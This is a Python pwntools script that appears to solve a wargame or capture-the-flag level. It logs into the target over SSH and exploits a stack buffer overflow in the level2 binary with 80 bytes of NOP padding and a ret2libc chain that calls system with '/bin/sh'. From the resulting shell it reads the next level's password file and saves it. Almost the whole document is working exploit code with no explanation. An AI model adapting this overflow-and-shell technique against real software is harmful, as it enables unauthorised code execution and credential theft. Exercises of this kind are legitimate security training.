#!/usr/bin/python3

from pwn import *

host = '10.11.248.120'
port = 4242
user = 'level2'
password = open("../level1/flag", "rb").read()

with ssh(user=user, host=host, port=port, password=password) as s:

    p = s.process(["./level2"])

    def ssh_send(line):
        if type(line) == str:
            line = line.encode("utf-8")
        elif type(line) != bytes:
            print("[x] Wrong data format !")
            raise ValueError
        print(f"[x] Length : {len(line)}")
        print(f"[x] Sending: {line!r}")
        p.sendline(line)

    def ssh_recv(timeout = 1.0):
        data = p.recv(timeout=timeout)
        text = data.decode(errors='ignore')
        print(f"[x] Received: {text!r}")
        return text

    def wait_for_shell():
        while True:
            output = ssh_recv()
            if output == "$ ":
                break

    try:
    
        PADDING = 80
        RET     = 0x0804853e
        SYSTEM  = 0xb7e6b060
        BINSH   = 0xb7f8cc58

        payload = b"\x90" * PADDING
        payload += p32(RET) + p32(SYSTEM) + p32(0x90909090) + p32(BINSH)
        ssh_send(payload)

        wait_for_shell()

        ssh_send("cat /home/user/level3/.pass")
        flag = ssh_recv().split('\n')[0]

    except ValueError:
        exit(1)

    print(f"\nlevel3 password: {flag}\n")

    flagfile = open("flag", "wb")
    flagfile.write(flag.encode("utf-8"))

    s.close()

